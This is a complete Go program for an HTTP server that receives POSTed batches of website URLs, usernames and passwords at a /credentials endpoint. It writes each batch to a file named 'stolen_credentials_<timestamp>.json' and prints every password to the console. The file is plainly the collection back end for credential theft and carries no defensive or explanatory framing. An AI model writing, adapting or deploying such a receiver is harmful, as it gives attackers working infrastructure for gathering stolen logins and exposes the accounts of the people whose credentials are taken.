package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"time"
)

type Credential struct {
	URL       string `json:"url"`
	Username  string `json:"username"`
	Password  string `json:"password"`
	Timestamp string `json:"timestamp"`
}

func handleCredentials(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var credentials []Credential
	if err := json.NewDecoder(r.Body).Decode(&credentials); err != nil {
		http.Error(w, "Invalid request body", http.StatusBadRequest)
		return
	}

	timestamp := time.Now().Format("20060102_150405")
	filename := fmt.Sprintf("stolen_credentials_%s.json", timestamp)


	file, err := os.Create(filename)
	if err != nil {
		log.Printf("Error creating file: %v", err)
		http.Error(w, "Internal server error", http.StatusInternalServerError)
		return
	}
	defer file.Close()

	encoder := json.NewEncoder(file)
	encoder.SetIndent("", "  ")
	if err := encoder.Encode(credentials); err != nil {
		log.Printf("Error writing to file: %v", err)
		http.Error(w, "Internal server error", http.StatusInternalServerError)
		return
	}
	fmt.Printf("\nReceived %d credentials:\n", len(credentials))
	for _, cred := range credentials {
		fmt.Printf("\nURL: %s\nUsername: %s\nPassword: %s\nTimestamp: %s\n",
			cred.URL, cred.Username, cred.Password, cred.Timestamp)
		fmt.Println("----------------------------------------")
	}

	fmt.Printf("\nCredentials saved to: %s\n", filename)
	w.WriteHeader(http.StatusOK)
}

func main() {
	if err := os.MkdirAll("server", 0755); err != nil {
		log.Fatal(err)
	}

	if err := os.Chdir("server"); err != nil {
		log.Fatal(err)
	}

	http.HandleFunc("/credentials", handleCredentials)

	port := ":8080"
	fmt.Printf("Server listening on port %s\n", port)
	fmt.Printf("Send credentials to: http://localhost%s/credentials\n", port)
	if err := http.ListenAndServe(port, nil); err != nil {
		log.Fatal(err)
	}
}
